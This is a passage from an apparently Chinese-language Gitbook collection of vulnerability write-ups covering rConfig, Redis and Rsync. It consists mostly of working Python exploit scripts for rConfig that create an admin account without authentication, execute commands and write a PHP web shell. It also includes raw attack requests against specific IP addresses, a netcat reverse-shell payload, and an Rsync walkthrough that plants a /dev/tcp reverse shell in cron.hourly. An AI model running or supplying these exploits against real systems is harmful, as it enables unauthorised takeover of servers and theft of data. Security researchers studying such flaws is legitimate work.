\"Origin\": origin} cookies = {'PHPSESSID': 'test'} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: username = 'pqtest{}'.format(ran_number) password = 'PQtest@{}'.format(ran_number) print(\"\\033[36m[o] 成功创建账户 pqtest{}/PQtest@{} \\033[0m\".format(ran_number, ran_number)) POC_2(target_url, username, password) else: print(\"\\033[31m[x] 创建失败:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, username, password): print(\"\\033[36m[o] 正在登陆账户..... \\033[0m\") vuln_url = target_url + \"/lib/crud/userprocess.php\" headers = { 'Content-Type': \"application/x-www-form-urlencoded; charset=UTF-8\", \"Referer\": target_url + \"deviceConnTemplates.php\", \"Origin\": target_url, \"X-Requested-With\": \"XMLHttpRequest\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = { 'user': username, 'pass': password, 'sublogin': '1' } try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在尝试执行 cat /etc/passwd.....\\033[0m\") with requests.Session() as s: p = s.post(target_url + '/lib/crud/userprocess.php', data=data, verify=False) if \"Stephen Stack\" in p.text: print(\"\\033[31m[x] 登录失败 \\033[0m\") else: rce = s.get(target_url + '/lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;cat%20/etc/passwd%3E../../pq.txt', verify=False, headers=headers) if \"success\" in rce.text: response = s.get(target_url + '/pq.txt', verify=False) print(\"\\033[36m[o] 成功执行 cat /etc/passwd, 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:24 "},"Web安全/rConfig/rConfig ajaxEditTemplate.php 后台远程命令执行漏洞/rConfig ajaxEditTemplate.php 后台远程命令执行漏洞.html":{"url":"Web安全/rConfig/rConfig ajaxEditTemplate.php 后台远程命令执行漏洞/rConfig ajaxEditTemplate.php 后台远程命令执行漏洞.html","title":"rConfig ajaxEditTemplate.php 后台远程命令执行漏洞","keywords":"","body":"rConfig ajaxEditTemplate.php 后台远程命令执行漏洞 漏洞描述 rConfig ajaxEditTemplate.php 存在后台远程命令执行 漏洞影响 [!NOTE] rConfig FOFA [!NOTE] app=\"rConfig\" 漏洞复现 漏洞文件为 rconfig/www/lib/ajaxHandlers/ajaxEditTemplate.php logged_in) { echo 'Don\\'t bother trying to hack me!!!!! This hack attempt has been logged'; $log->Warn(\"Security Issue: Some tried to access this file directly from IP: \" . $_SERVER['REMOTE_ADDR'] . \" & Username: \" . $session->username . \" (File: \" . $_SERVER['PHP_SELF'] . \")\"); // need to add authentication to this script header(\"Location: \" . $config_basedir . \"login.php\"); } else { $ymlData = Spyc::YAMLLoad($_POST['code']); $fileName = $_POST['fileName']; $check_yml_extension = explode('.', $fileName); if(@!array_key_exists($check_yml_extension[1])){ if(@$check_yml_extension[1] != 'yml'){ $fileName = $fileName . '.yml'; } } $fullpath = $config_templates_basedir.$fileName; $username = $_SESSION['username']; require_once(\"../../../classes/db2.class.php\"); require_once(\"../../../classes/ADLog.class.php\"); $db2 = new db2(); $log = ADLog::getInstance(); if (!is_dir('templates')) { mkdir('templates'); chown('templates', 'apache'); } // if'' to create the filename based on the command if not created & chmod to 666 if (!file_exists($fullpath)) { exec(\"touch \" . $fullpath); chmod($fullpath, 0666); } // if the file is alread in place chmod it to 666 before writing info chmod($fullpath, 0666); // dump array into file & chmod back to RO $filehandle = fopen($fullpath, 'w+'); file_put_contents($fullpath, $_POST['code']); fclose($filehandle); chmod($fullpath, 0444); $db2->query(\"UPDATE `templates` SET `fileName` = :fileName, `name` = :name, `desc` = :desc, `dateLastEdit` = NOW(), `addedby` = :username WHERE `id` = :id\"); $db2->bind(':id', $_POST['id']); $db2->bind(':fileName', $fullpath); $db2->bind(':name', $ymlData['main']['name']); $db2->bind(':desc', $ymlData['main']['desc']); $db2->bind(':username', $username); $queryResult = $db2->execute(); /* Update successful */ if ($queryResult && file_exists($fullpath)) { $response = \"success\"; $log->Info(\"Success: Template: \".$fullpath.\" edited in templates folder\"); } /* Update failed */ else { $response = \"failed\"; $log->Warn(\"Success: Could not edit Template \".$fullpath.\" in templates folder\"); } echo json_encode($response); } // end session check 关键代码如下 // if'' to create the filename based on the command if not created & chmod to 666 if (!file_exists($fullpath)) { exec(\"touch \" . $fullpath); chmod($fullpath, 0666); } // if the file is alread in place chmod it to 666 before writing info chmod($fullpath, 0666); // dump array into file & chmod back to RO $filehandle = fopen($fullpath, 'w+'); file_put_contents($fullpath, $_POST['code']); fclose($filehandle); chmod($fullpath, 0444; $fileName --> $fullpath ---> 写入文件，其中 fileName参数 POST传入时没有过滤导致目录可上传任意位置 $ymlData = Spyc::YAMLLoad($_POST['code']); $fileName = $_POST['fileName']; $check_yml_extension = explode('.', $fileName); if(@!array_key_exists($check_yml_extension[1])){ if(@$check_yml_extension[1] != 'yml'){ $fileName = $fileName . '.yml'; } } $fullpath = $config_templates_basedir+ .$fileName; $filehandle = fopen($fullpath, 'w+'); file_put_contents($fullpath, $_POST['code']); POST code 传参写入文件 pq.php.yml, 请求包如下 POST /lib/ajaxHandlers/ajaxEditTemplate.php HTTP/1.1 Host: Cookie: PHPSESSID=fv8j4c6r4gofug1vr9v3efdvj7 Content-Length: 81 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Origin: https://176.62.195.243 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: https://176.62.195.243/lib/ajaxHandlers/ajaxEditTemplate.php fileName=../www/pq.php&code=&id=1 这里写入文件 pq.php.yml,并使用 ../ 跳出限制的目录，访问 pq.php.yml 实际访问了 pq.php，执行id命令 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from requests_toolbelt.multipart.encoder import MultipartEncoder def POC_1(target_url): vuln_url = target_url + \"/lib/crud/userprocess.php\" referer = target_url + \"useradmin.php\" ran_number = random.randint(1, 999) origin = target_url multipart_data = MultipartEncoder( fields={ 'username': 'pqtest{}'.format(ran_number), 'password': 'PQtest@{}'.format(ran_number), 'passconf': 'PQtest@{}'.format(ran_number), 'email': 'PQtest{}@test.com'.format(ran_number), 'ulevelid': '9', 'add': 'add', 'editid': '' } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\": origin} cookies = {'PHPSESSID': 'test'} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: username = 'pqtest{}'.format(ran_number) password = 'PQtest@{}'.format(ran_number) print(\"\\033[36m[o] 成功创建账户 pqtest{}/PQtest@{} \\033[0m\".format(ran_number, ran_number)) POC_2(target_url, username, password) else: print(\"\\033[31m[x] 创建失败:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, username, password): print(\"\\033[36m[o] 正在登陆账户..... \\033[0m\") vuln_url = target_url + \"/lib/crud/userprocess.php\" headers = { 'Content-Type': \"application/x-www-form-urlencoded; charset=UTF-8\", \"Referer\": target_url + \"deviceConnTemplates.php\", \"Origin\": target_url, \"X-Requested-With\": \"XMLHttpRequest\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = { 'user': username, 'pass': password, 'sublogin': '1' } try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在尝试执行 id....\\033[0m\") with requests.Session() as s: p = s.post(target_url + '/lib/crud/userprocess.php', data=data, verify=False) if \"Stephen Stack\" in p.text: print(\"\\033[31m[x] 登录失败 \\033[0m\") else: data = \"fileName=..%2Fwww%2Fpq.php&code=%3C%3Fphp+echo+system%28%27id%27%29%3B%3F%3E&id=1\" rce = s.post(target_url + '/lib/ajaxHandlers/ajaxEditTemplate.php', verify=False, data=data, headers=headers) if \"success\" in rce.text: response = s.get(target_url + '/pq.php.yml', verify=False) print(\"\\033[36m[o] 成功执行 id, 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:25 "},"Web安全/rConfig/rConfig useradmin.inc.php 信息泄露漏洞/rConfig useradmin.inc.php 信息泄露漏洞.html":{"url":"Web安全/rConfig/rConfig useradmin.inc.php 信息泄露漏洞/rConfig useradmin.inc.php 信息泄露漏洞.html","title":"rConfig useradmin.inc.php 信息泄露漏洞","keywords":"","body":"rConfig useradmin.inc.php 信息泄露漏洞 漏洞描述 rConfig useradmin.inc.php 存在信息泄露漏洞，通过访问文件获取用户邮箱信息和登录名 漏洞影响 rConfig FOFA app=\"rConfig\" 漏洞复现 出现漏洞的文件 query(\"SELECT timeZone FROM settings\"); $result = $db2->resultsetCols(); $timeZone = $result[0]; date_default_timezone_set($timeZone); /* Get Row count from users where NOT deleted */ $db2->query('SELECT COUNT(*) AS total FROM users WHERE status = 1'); $row = $db2->resultsetCols(); $result[\"total\"] = $row[0]; /* Instantiate Paginator Class */ $pages = new Paginator; $pages->items_total = $result['total']; $pages->mid_range = 7; // Number of pages to display. Must be odd and > 3 $pages->paginate(); echo $pages->display_pages(); echo \"\" . $pages->display_jump_menu() . $pages->display_items_per_page() . \"\"; /* GET all nodes records from DB */ $db2->query(\"SELECT id, username, userlevel, email, timestamp FROM users WHERE status = 1 $pages->limit\"); $resultSelect = $db2->resultset(); // push rows to $itesm array $items = array(); foreach ($resultSelect as $row) { array_push($items, $row); } /* Create Multidimensional array for use later */ $result[\"rows\"] = $items; $i = 0; # row counter to enable alternate row coloring ?> Username E-mail User Level Last Login '; ?> \"/> display_pages(); echo \"\"; echo \"Page: $pages->current_page of $pages->num_pages\\n\"; 文件没有设定权限，任何人可以访问泄露信息 漏洞验证的Url为 /useradmin.inc.php Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:26 "},"Web安全/rConfig/rConfig userprocess.php 任意用户创建漏洞/rConfig userprocess.php 任意用户创建漏洞.html":{"url":"Web安全/rConfig/rConfig userprocess.php 任意用户创建漏洞/rConfig userprocess.php 任意用户创建漏洞.html","title":"rConfig userprocess.php 任意用户创建漏洞","keywords":"","body":"rConfig userprocess.php 任意用户创建漏洞 漏洞描述 rConfig userprocess.php 存在任意用户创建漏洞，发送特定的请求包攻击者可以创建管理员账户登录后台 漏洞影响 rConfig FOFA app=\"rConfig\" 漏洞复现 出现漏洞的文件为 userproce.php procLogin(); } /* Admin submitted user add form */ else if (isset($_POST['add']) && isset($_POST['editid']) && empty($_POST['editid'])) { $this->procRegister(); } /* Admin submitted user edit form */ else if (isset($_POST['add']) && isset($_POST['editid']) && !empty($_POST['editid'])) { $this->procUpdateAccount(); } /* User submitted forgot password form */ else if (isset($_POST['subforgot'])) { $this->procForgotPass(); } /* User submitted edit account form */ else if (isset($_POST['subedit'])) { $this->procEditAccount(); } /** * The only other reason user should be directed here * is if he wants to logout, which means user is * logged in currently. */ else if ($session->logged_in) { $this->procLogout(); } /** * Should not get here, which means user is viewing this page * by mistake and therefore is redirected. */ else { header(\"Location: /login.php\"); } } /** * procLogin - Processes the user submitted login form, if errors * are found, the user is redirected to correct the information, * if not, the user is effectively logged in to the system. */ function procLogin() { global $session, $form; /* Login attempt */ $retval = $session->login($_POST['user'], $_POST['pass'], isset($_POST['remember'])); /* Login successful */ if ($retval) { header(\"Location: \" . $session->referrer); } /* Login failed */ else { $_SESSION['value_array'] = $_POST; $_SESSION['error_array'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer); } } /** * procLogout - Simply attempts to log the user out of the system * given that there is no logout form to process. */ function procLogout() { global $session; $retval = $session->logout(); header(\"Location: /login.php\"); } /** * procRegister - Processes the user submitted registration form, * if errors are found, the user is redirected to correct the * information, if not, the user is effectively registered with * the system and an email is (optionally) sent to the newly * created user. */ function procRegister() { global $session, $form; /* Convert username to all lowercase (by option) */ if (ALL_LOWERCASE) { $_POST['username'] = strtolower($_POST['username']); } /* Registration attempt */ $retval = $session->register($_POST['username'], $_POST['password'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Registration Successful */ if ($retval == 0) { $_SESSION['reguname'] = $_POST['username']; $_SESSION['regsuccess'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully added to Database\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['reguname'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be added to Database\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } } /** * procForgotPass - Validates the given username then if * everything is fine, a new password is generated and * emailed to the address the user gave on sign up. */ function procForgotPass() { global $database, $session, $mailer, $form; /* Username error checking */ $subuser = $_POST['user']; $field = \"user\"; //Use field name for username if (!$subuser || strlen($subuser = trim($subuser)) == 0) { $form->setError($field, \"Username not entered\"); $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } else { /* Make sure username is in database */ $subuser = stripslashes($subuser); if (strlen($subuser) 30 || !preg_match(\"/^([0-9a-z])+$/\", $subuser) || (!$database->usernameTaken($subuser))) { $form->setError($field, \"Unknown Username\"); $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } } /* Errors exist, have user correct them */ if ($form->num_errors > 0) { $_SESSION['value_array'] = $_POST; $_SESSION['error_array'] = $form->getErrorArray(); } else { /* Generate new password */ $newpass = $session->generateRandStr(8); /* Get email of user */ $usrinf = $database->getUserInfo($subuser); $email = $usrinf['email']; /* Attempt to send the email with new password */ if ($mailer->sendNewPass($subuser, $email, $newpass)) { /* Email sent, update database */ $database->updateUserField($subuser, \"password\", md5($newpass)); echo \"\" . \"alert('Your new password has been generated. The password was emailed to $email');\" . \"window.close();\" . \"\"; }/* Email failure, do not change password */ else { $_SESSION['forgotpass'] = false; } } } /** * procEditAccount - Attempts to edit the user's account * information, including the password, which must be verified * before a change is made. */ function procEditAccount() { global $session, $form; /* Account edit attempt */ $retval = $session->editAccount($_POST['editid'], $_POST['username'], $_POST['curpass'], $_POST['newpass'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Account edit successful */ if ($retval == 0) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['useredit'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } } /** * procEditAccount - Attempts to edit the user's account * information, including the password, which must be verified * before a change is made. */ function procUpdateAccount() { // http or https check for url Protocol $protocol = 'http'; if (isset($_SERVER['HTTPS'])) { if (strtoupper($_SERVER['HTTPS']) == 'ON') { $protocol = 'https'; } } global $session, $form; /* Account edit attempt */ $retval = $session->updateAccount($_POST['editid'], $_POST['username'], $_POST['password'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Account edit successful */ if ($retval == 0) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['useredit'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $protocol . \"://\" . $_SERVER['HTTP_HOST'] . \"/\" . \"useradmin.php\"); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $protocol . \"://\" . $_SERVER['HTTP_HOST'] . \"/\" . \"useradmin.php?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $protocol . \"://\" . $_SERVER['HTTP_HOST'] . \"/\" . \"useradmin.php\"); } } } /* Initialize process */ $process = new Process; 出现漏洞的原因是对权限设定错误，任何人都可以通过访问这个文件创建管理员用户 发送如下请求包创建管理员用户 pqtest，密码为 [email protected]/* */ POST /lib/crud/userprocess.php HTTP/1.1 Host: 194.149.41.11 User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: multipart/form-data; boundary=b1467349fcce4aa0ae8d44439f4e06bc Upgrade-Insecure-Requests: 1 Referer: http://194.149.41.11/useradmin.php Origin: http://194.149.41.11/ Cookie: PHPSESSID=pq Content-Length: 697 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"username\" pqtest --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"password\" [email protected]/* */ --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"passconf\" [email protected]/* */ --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"email\" [email protected]/* */ --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"ulevelid\" 9 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"add\" add --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"editid\" --b1467349fcce4aa0ae8d44439f4e06bc-- 成功创建用户 pqtest，以管理员身份登录后台 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from requests_toolbelt.multipart.encoder import MultipartEncoder def POC_1(target_url): vuln_url = target_url + \"/lib/crud/userprocess.php\" referer = target_url + \"useradmin.php\" ran_number = random.randint(1, 999) origin = target_url multipart_data = MultipartEncoder( fields={ 'username': 'pqtest{}'.format(ran_number), 'password': 'PQtest@{}'.format(ran_number), 'passconf': 'PQtest@{}'.format(ran_number), 'email': [email protected]/* */'.format(ran_number), 'ulevelid': '9', 'add': 'add', 'editid': '' } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\": origin} cookies = {'PHPSESSID': 'pqtest{}'.format(ran_number)} print(\"\\033[36m[o] 正在创建账户..... \\033[0m\".format(ran_number, ran_number)) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: print(\"\\033[36m[o] 成功创建账户 pqtest{}/PQtest@{} \\033[0m\".format(ran_number, ran_number)) else: print(\"\\033[31m[x] 创建失败:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:26 "},"Web安全/rConfig/rConfig v3.9.6 远程命令执行/rConfig v3.9.6 远程命令执行.html":{"url":"Web安全/rConfig/rConfig v3.9.6 远程命令执行/rConfig v3.9.6 远程命令执行.html","title":"rConfig v3.9.6 远程命令执行","keywords":"","body":"rConfig v3.9.6 远程命令执行 一、漏洞简介 rConfig是\"开源网络设备配置管理实用程序，可对设备进行频繁的配置快照。开源，由Network Architects构建-我们知道您的需求！\" rConfig远程未经身份验证的RCE中的两个漏洞。一个漏洞允许未经身份验证的用户进行身份验证，另一个漏洞（身份验证后）允许攻击者执行任意代码。 厂商最初的反应非常迅速，并且立刻发布了一个更新版本（v3.9.6），我们最初是在v3.9.5上验证了该漏洞。但是我们发现，v3.9.6版本中同样存在安全漏洞，并将此情况反应给了厂商。目前为止，我们还不知道有没有安全补丁能够解决或缓解这两个漏洞所带来的影响。 二、漏洞影响 rConfig v3.9.6 及其之前版本 三、复现过程 poc rConfig.py 需要修改代码里面的部分内容 import requests from requests_toolbelt.multipart.encoder import MultipartEncoder import urllib3 import re #from bs4 import BeautifulSoup urllib3.disable_warnings() url=\"https://x.x.x.x/\" #change this to fit your URL (adding the last slash) payload=\"nc y.y.y.y 9001 -e /bin/sh\" #change this to whatever payload you want payload_rce= \"fileName=../www/test.php&code=&id=3\" #if you want to use Method 2 for RCE, use a PHP, urlencoded payload as the value of the code parameter print(\"Connecting to: {}\".format(url)) print(\"Connect back is set to: {}, please launch 'nc -lv 9001'\".format(payload)) x = requests.get(url+\"login.php\", verify=False) version = re.search(\"(.*)\", x.text) version = version.group(1) if version == \"rConfig Version 3.9.5\": print(\"Version 3.9.5 confirmed\") else: print(\"Version is \"+version+ \" it may not be vulnerable\") payload_final=\";\"+payload referer=url+\"useradmin.php\" origin=url proxies = {\"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\"} #in case you need to debug the exploit with Burp, add ', proxies=proxies' to any request def createuser(): multipart_data = MultipartEncoder( fields={ 'username': 'test', 'password': 'Testing1@', #password should have a capital letter, lowercase, number and a symbol 'passconf': 'Testing1@', 'email': 'test@test.com', 'ulevelid': '9', 'add': 'add', 'editid': '' } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\":origin} cookies = {'PHPSESSID': 'test'} response = requests.post(url+'lib/crud/userprocess.php', data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: print(\"(+) User test created\") else: print(\"(-) User couldn't be created, please debug the exploit\") def exploit(): payload = { 'user': 'test', 'pass': 'Testing1@', 'sublogin': '1' } with requests.Session() as s: p = s.post(url+'lib/crud/userprocess.php', data=payload, verify=False) if \"Stephen Stack\" in p.text: print(\"(-) Exploit failed, could not login as user test\") else: print(\"(+) Log in as test completed\") params = {'path':'test', 'ext': payload_final } rce=s.get(url+'lib/ajaxHandlers/ajaxArchiveFiles.php', verify=False, params=params) if \"success\" in rce.text: print(\"(+) Payload executed successfully\") else: print(\"(-) Error when executing payload, please debug the exploit\") #if you used method 2 to auth bypass and 1 for RCE, ignore this message payload = { 'user': 'admin', 'pass': 'Testing1@', 'sublogin': '1' } with requests.Session() as s: p = s.post(url+'lib/crud/userprocess.php', data=payload, verify=False) if \"Stephen Stack\" in p.text: print(\"(-) Exploit failed, could not login as user test\") else: print(\"(+) Log in as test completed\") params = {'path':'test', 'ext': payload_final } rce=s.get(url+'lib/ajaxHandlers/ajaxArchiveFiles.php', verify=False, params=params) if \"success\" in rce.text: print(\"(+) Payload executed successfully\") else: print(\"(-) Error when executing payload, please debug the exploit\") def user_enum_update(): users=requests.get(url+'useradmin.inc.php', verify=False) #matchObj = re.findall(r'(.*?)', users.text, re.M|re.I|re.S) if \"admin\" in users.text: print(\"(+) The admin user is present in this rConfig instance\") multipart_data = MultipartEncoder( fields={ 'username': 'admin', 'password': 'Testing1@', #password should have a capital letter, lowercase, number and a symbol 'passconf': 'Testing1@', 'email': [email protected]/* */', 'ulevelid': '9', 'add': 'add', 'editid': '1' #you may need to increment this if you want to reset the password of a different user } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\":origin} cookies = {'PHPSESSID': 'test'} response = requests.post(url+'lib/crud/userprocess.php', data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: print(\"(+) The new password for the admin user is Testing1@\") else: print(\"(-) Admin user couldn't be edited, please debug the exploit\") elif \"Admin\" in users.text: print(\"(+) There is at least one Admin user, check \"+ str(url)+\"useradmin.inc.php manually and modify the exploit accordingly (erase the if-elif statements of this function and modify the user payload)\") def template(): payload = { 'user': 'admin', 'pass': 'Testing1@', 'sublogin': '1' } # headers_rce = {'Content-Type': \"application/x-www-form-urlencoded; charset=UTF-8\", \"Referer\": url+\"deviceConnTemplates.php\", \"Origin\":origin, \"X-Requested-With\": \"XMLHttpRequest\", \"Accept-Language\": \"en-US,en;q=0.5\"} with requests.Session() as s: p = s.post(url+'lib/crud/userprocess.php', data=payload, verify=False) if \"Stephen Stack\" in p.text: print(\"(-) Exploit failed, could not login as user test\") else: print(\"(+) Log in as admin completed\") rce=s.post(url+'lib/ajaxHandlers/ajaxEditTemplate.php', verify=False, data=payload_rce, headers=headers_rce) if \"success\" in rce.text: print(\"(+) File created\") rce_req = s.get(url+'test.php.yml', verify=False) print(\"(+) Command results: \") print(rce_req.text) else: print(\"(-) Error when executing payload, please debug the exploit\") def main(): print(\"Remote Code Execution + Auth bypass rConfig 3.9.5 by Daniel Monzón\") print(\"In the last stage if your payload is a reverse shell, the exploit may not launch the success message, but check your netcat ;)\") print(\"Note: preferred method for auth bypass is 1, because it is less 'invasive'\") print(\"Note2: preferred method for RCE is 2, as it does not need you to know if, for example, netcat has been installed in the target machine\") print('''Choose method for authentication bypass: 1) User creation 2) User enumeration + User edit ''') auth_bypass=str(input(\"Method>\")) if auth_bypass == \"1\": createuser() elif auth_bypass == \"2\": user_enum_update() print('''Choose method for RCE: 1) Unsafe call to exec() 2) Template edit ''') rce_method=str(input(\"Method>\")) if rce_method == \"1\": exploit() elif rce_method == \"2\": template() main() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:27 "},"Web安全/Redis/redis未授权访问漏洞/redis未授权访问漏洞.html":{"url":"Web安全/Redis/redis未授权访问漏洞/redis未授权访问漏洞.html","title":"redis未授权访问漏洞","keywords":"","body":"redis未授权访问漏洞 一、漏洞简介 redis未授权访问漏洞 二、影响范围 三、复现过程 1.环境安装 从官网wget到本地 wget http://download.redis.io/releases/redis-3.2.11.tar.gz tar xzf redis-3.2.11.tar.gz 将redis.conf copy到 /etc/下 启动时使用命令 redis-server /etc/redis.conf 测试时建议 vim /etc/redis.conf 去掉ip绑定，允许除本地外的主机远程登录redis服务 (1)bind 127.0.0.1前面加上##号注释掉 或者更改成 0.0.0.0 (2)protected-mode设为no 如图 2.攻击者常用命令 （1）info 查看信息 （2）flushall 删除所有数据库内容： （3）flushdb 刷新数据库 （4）看所有键：KEYS *，使用select num可以查看键值数据。 （5）set test \"who am i\" 设置变量 （6）config set dir dirpath 设置路径等配置 （7）config get dir/dbfilename 获取路径及数据配置信息 （8）save 保存 （9）get 变量，查看变量名称 3.msf下利用模块 auxiliary/scanner/redis/file_upload auxiliary/scanner/redis/redis_login auxiliary/scanner/redis/redis_server 4.nmap获取信息 命令：nmap -A -p 6379 --script redis-info ipaddress 5.连接Redis服务器 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:33 "},"Web安全/Rsync/Rsync 未授权访问漏洞/Rsync 未授权访问漏洞.html":{"url":"Web安全/Rsync/Rsync 未授权访问漏洞/Rsync 未授权访问漏洞.html","title":"Rsync 未授权访问漏洞","keywords":"","body":"Rsync 未授权访问漏洞 一、漏洞简介 rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。 rsync的常用命令 列举整个同步目录或指定目录： rsync ip:: rsync ip::xxx/ 下载文件或目录到本地： rsync -avz ip::xxx/xx.php /root rsync -avz ip::xxx/ /var/tmp 上传文件到服务器： rsync -avz webshell.php ip::web/ 二、漏洞影响 三、复现过程 nmap先扫一波： rsync rsync://www.0-sec.org:873/ rsync rsync://www.0-sec.org:873/src 来查看模块名列表 我们再列出src模块下的文件 rsync rsync://www.0-sec.org:873/src/ 我们可以下载任意文件： rsync -av rsync://www.0-sec.org:873/src/etc/passwd ./ 提权： 写入shell并赋权： #!/bin/bash /bin/bash -i >& /dev/tcp/192.168.91.128/4444 0>&1 chmod +x shell 将shell上传至/etc/cron.hourly： rsync -av shell rsync://192.168.91.130/src/etc/cron.hourly rsync -av shell rsync://www.0-sec.org:873/src/etc/cron.d/shell 本地监听： nc -nvv -lp 4444 参考链接 